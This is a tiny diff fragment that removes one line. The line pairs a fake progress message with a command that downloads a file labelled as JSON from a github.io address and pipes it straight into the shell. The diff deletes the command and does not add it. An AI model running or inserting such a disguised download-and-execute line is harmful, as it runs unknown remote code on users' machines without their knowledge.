@@ -1,1 +1,0 @@
-echo Progress: 91.00%curl -L --progress-bar frkns.github.io/fun/scoringReduction.json | sh
